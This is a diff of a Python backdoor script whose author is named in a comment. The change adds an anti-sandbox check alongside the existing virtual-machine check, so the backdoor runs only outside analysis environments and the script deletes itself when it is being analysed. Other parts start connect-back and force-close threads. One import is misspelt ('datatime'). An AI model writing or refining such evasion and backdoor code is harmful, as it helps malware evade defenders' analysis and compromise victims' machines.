@@ -13,10 +13,11 @@ import socket
 import datatime
 import time
 import sys
-from VMsensor import TestVM
 
+from VMsensor import TestVM
+from antisandbox import antisandbox
 #Coded by B3mB4m
-#b3mb4m@gmail.com
+#b3mb4m@tuta.io
 	
 class BackDoor(object):
 	def __init__(self):
@@ -63,10 +64,9 @@ class BackDoor(object):
 		threading.Thread(target=self.bc).start()#(4) Start bc  -------\\\ That functions 
 		threading.Thread(target=self.forceclose).start() #Force close--//	will be working some time ..
 	
-    
-if TestVM().checkVirtualMachine() != True:
+   
+if TestVM().checkVirtualMachine() != True and antisandbox() != True:
 	BackDoor().run() 
 else:
 	os.remove(sys.argv[0]) #much better :)
 	#time.sleep(9999999) 
-  #RUN RUN RUN RUN !!
